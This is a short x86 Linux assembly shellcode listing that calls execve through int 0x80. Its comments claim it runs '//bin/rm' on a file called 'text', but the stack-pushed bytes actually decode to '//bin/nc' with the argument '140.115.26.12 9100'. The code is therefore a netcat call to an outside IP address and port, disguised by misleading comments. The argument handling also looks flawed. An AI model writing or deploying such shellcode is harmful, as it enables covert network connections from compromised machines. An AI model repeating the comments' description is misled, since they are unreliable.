global _start

section .text
_start:

	;push 0x00000000 on the Stack because the end of string

	xor eax, eax
	push eax
	
	;push //bin/rm in reverse i.e. mr/nib//
	push 0x636e2f6e
        push 0x69622f2f
	
	mov ebx,esp

	;push 0x00000000 on the Stack because the end of string 

	push eax
	mov edx, esp
	
	;push "text" in reverse
	
	push word 0x3030
	push 0x31392032
	push 0x312e3632
	push 0x2e353131
	push 0x2e303431
	mov esi,esp
	
	;push 0x00000000 on the Stack because the end of string 

	push eax

	;push the address of "text" on the stack
	
	push esi

	;push the address of "//bin/rm" on the stack
	
	push ebx	
	mov ecx,esp

	mov al,11
	int 0x80
